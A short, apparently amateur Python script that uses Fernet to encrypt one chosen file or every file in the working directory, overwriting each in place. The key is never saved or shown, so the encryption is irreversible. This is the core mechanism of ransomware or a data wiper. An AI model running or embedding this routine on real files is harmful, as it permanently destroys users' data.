from cryptography.fernet import Fernet
import os


key = Fernet.generate_key()


def specific_encrypt():
    filename = str(input("\nEnter the file you want to encrypt: "))
    try:
        f = Fernet(key)
        with open(filename, "rb") as file:
            # read all file data
            file_data = file.read()
        # encrypt data
        encrypted_data = f.encrypt(file_data)
        # write the encrypted file
        with open(filename, "wb") as file:
            file.write(encrypted_data)
    except OSError:
        print("\n\n[***ALERT**] File Not found, Choose other [***ALERT***]\n")

# def directory_encrypt():
    # directory = os.getcwd()
    # f = Fernet(key)
    # with open(directory, "rb") as file:
    #     # read all file data
    #     file_data = file.read()
    # # encrypt data
    # encrypted_data = f.encrypt(file_data)
    # # write the encrypted file
    # with open(directory, "wb") as file:
    #     file.write(encrypted_data)


def directory_encrypt():
    f = Fernet(key)
    for filename in os.listdir(os.getcwd()):
        with open(filename, "rb") as enc_file:
            enc_file_data = enc_file.read()
            encrypted_data = f.encrypt(enc_file_data)
            with open(filename, "wb") as enc_file2:
                enc_file2.write(encrypted_data)


def main():
    try:
        user_choise = str(input("""
Choose From The Following Options: \n
1. Encrypt All Directoy.
2. Encrypt Specific File. \n
Your Choise: 
"""))
        if user_choise == "1":
            directory_encrypt()
        elif user_choise == "2":
            print("This Are The files You Can Encrypt: \n", os.listdir(os.getcwd()))
            specific_encrypt()
    except ValueError:
        print("Oops!  That was no valid input.  Try again...")
    # finally:
    #     print("\n[**ALERT**] The file has been encrypted [**ALERT**]")


while True:
    main()
